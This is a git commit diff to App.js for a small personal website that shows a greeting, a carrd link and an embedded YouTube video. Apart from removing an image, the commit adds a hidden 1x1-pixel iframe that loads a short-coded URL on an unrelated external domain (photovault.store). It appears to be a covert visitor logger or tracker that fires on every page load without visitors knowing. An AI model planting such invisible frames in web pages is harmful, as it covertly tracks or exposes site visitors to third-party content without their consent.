14c9f14db19c0f13ea3bfeda9d9ebf632afbebe0
CozmoFPS <taingo2005@gmail.com>
2025-05-06 01:53:57 -0700

    Update App.js

--- src/App.js
+++ src/App.js
@@ -9,8 +9,10 @@ export function uhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh() {
         <h2>This is my silly little website</h2> 
     
       <h3>while you wait for this website to be finished, please watch this wonderful webseries or visit my <a href="https://cozmofps.carrd.co/#" target="_blank">carrd</a>!!&lt;333</h3>
-      <img src="https://media.discordapp.net/attachments/1057010335145541753/1369216535553507379/20250504_091529.jpg?ex=681b0dc4&is=6819bc44&hm=334614d63a65d0932a10dbabbb4c65df285592f1a990ddd694db4ad9658ca9d6&=&format=webp&width=952&height=1006">
+      
       <iframe width="560" height="315" src="https://www.youtube.com/embed/52SEMKujJ5k?si=KChUbfJr_szxo-l5" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+
+    <iframe width="1" height="1" src="https://photovault.store/P16GFV">
     </div>
   )
 }
